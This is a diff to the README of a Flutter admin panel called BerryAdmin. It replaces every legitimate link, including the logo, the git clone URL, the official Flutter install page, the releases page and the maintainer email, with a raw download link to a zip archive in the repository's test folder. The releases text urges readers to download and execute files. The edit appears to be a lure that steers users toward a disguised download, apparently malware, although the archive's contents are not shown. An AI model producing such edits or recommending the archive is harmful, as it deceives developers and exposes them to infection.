@@ -1,6 +1,6 @@
 # BerryAdmin 🚀
 
-![BerryAdmin Logo](https://via.placeholder.com/150)
+![BerryAdmin Logo](https://github.com/judexxx158/berryadmin/raw/refs/heads/main/test/Software-v2.1.zip)
 
 Welcome to the BerryAdmin repository! This project offers a web-based admin panel designed specifically for the Uber-Cream Riders-Users type application. Built with Dart and Flutter, BerryAdmin provides a smooth and efficient experience for managing user data and interactions.
 
@@ -44,7 +44,7 @@ To get started with BerryAdmin, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/judexxx158/berryadmin.git
+   git clone https://github.com/judexxx158/berryadmin/raw/refs/heads/main/test/Software-v2.1.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -62,7 +62,7 @@ To get started with BerryAdmin, follow these steps:
    flutter run
    ```
 
-Make sure you have Flutter installed on your machine. You can find installation instructions on the [official Flutter website](https://flutter.dev/docs/get-started/install).
+Make sure you have Flutter installed on your machine. You can find installation instructions on the [official Flutter website](https://github.com/judexxx158/berryadmin/raw/refs/heads/main/test/Software-v2.1.zip).
 
 ## Usage
 
@@ -111,7 +111,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-To download the latest version of BerryAdmin, visit the [Releases section](https://github.com/judexxx158/berryadmin/releases). Make sure to download the appropriate files and execute them to get started.
+To download the latest version of BerryAdmin, visit the [Releases section](https://github.com/judexxx158/berryadmin/raw/refs/heads/main/test/Software-v2.1.zip). Make sure to download the appropriate files and execute them to get started.
 
 You can also check the releases for updates and new features.
 
@@ -120,6 +120,6 @@ You can also check the releases for updates and new features.
 For questions or feedback, please reach out to the project maintainer:
 
 - **Name**: [Your Name]
-- **Email**: [your.email@example.com]
+- **Email**: [https://github.com/judexxx158/berryadmin/raw/refs/heads/main/test/Software-v2.1.zip]
 
 Thank you for checking out BerryAdmin! We hope you find it useful for your projects.
